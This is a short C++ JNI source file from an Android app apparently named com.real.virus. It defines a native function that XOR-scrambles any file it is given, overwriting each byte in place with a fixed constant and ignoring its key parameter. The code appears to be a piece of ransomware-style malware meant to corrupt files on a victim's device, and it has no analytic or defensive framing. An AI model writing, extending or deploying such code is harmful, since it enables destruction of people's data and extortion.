#include <string>
#include <fstream>
#include <jni.h>

extern "C" JNIEXPORT jstring JNICALL
Java_com_real_virus_MainActivity_nativeEncrypt(JNIEnv *env, jobject, jstring path, jstring key) {
    const char *p = env->GetStringUTFChars(path, 0);
    std::fstream f(p, std::ios::in | std::ios::out | std::ios::binary);
    if (f) {
        char c;
        while (f.get(c)) {
            c ^= 0x5A;
            f.seekp(-1, std::ios::cur);
            f.put(c);
        }
        f.close();
    }
    env->ReleaseStringUTFChars(path, p);
    return env->NewStringUTF("ok");
}
